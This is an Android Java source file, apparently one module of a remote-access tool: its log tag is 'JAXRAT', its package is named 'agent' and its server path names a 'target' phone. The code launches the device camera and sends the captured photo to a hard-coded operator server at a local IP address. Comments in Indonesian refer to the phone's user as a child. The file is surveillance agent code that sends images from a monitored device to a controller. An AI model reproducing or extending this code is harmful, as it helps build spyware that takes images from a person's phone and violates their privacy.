package com.ezax.agent;

import android.app.Activity;
import android.content.Intent;
import android.graphics.Bitmap;
import android.os.Bundle;
import android.provider.MediaStore;
import android.util.Log;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class CameraActivity extends Activity {
    // SESUAIKAN IP INI DENGAN IP LAPTOP KAMU SEKARANG
    private String serverUrl = "http://192.168.1.17:5000/api/upload_image/hp_target_1";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Buka aplikasi kamera bawaan Android
        Intent takePictureIntent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
        
        try {
            startActivityForResult(takePictureIntent, 100);
        } catch (Exception e) {
            kirimError("Gagal buka aplikasi kamera bawaan");
            finish();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == 100 && resultCode == RESULT_OK && data != null) {
            // Ambil gambar (thumbnail)
            Bundle extras = data.getExtras();
            Bitmap imageBitmap = (Bitmap) extras.get("data");
            
            if (imageBitmap != null) {
                // Kompres jadi JPEG
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                imageBitmap.compress(Bitmap.CompressFormat.JPEG, 50, baos);
                byte[] imageBytes = baos.toByteArray();
                uploadImage(imageBytes);
            } else {
                finish();
            }
        } else {
            // Kalau user (anak) membatalkan foto, tutup layar
            finish();
        }
    }

    private void uploadImage(byte[] imageBytes) {
        new Thread(() -> {
            try {
                URL url = new URL(serverUrl);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("POST");
                String boundary = "***";
                conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

                DataOutputStream request = new DataOutputStream(conn.getOutputStream());
                request.writeBytes("--" + boundary + "\r\n");
                request.writeBytes("Content-Disposition: form-data; name=\"image\";filename=\"image.jpg\"\r\n\r\n");
                request.write(imageBytes);
                request.writeBytes("\r\n--" + boundary + "--\r\n");
                request.flush(); request.close();
                
                Log.d("JAXRAT", "Upload Selesai: " + conn.getResponseCode());
            } catch (Exception e) { 
                Log.e("JAXRAT", "Upload Error", e); 
            }
            
            runOnUiThread(this::finish); 
        }).start();
    }

    private void kirimError(String pesan) {
        Log.e("JAXRAT", pesan);
    }
}
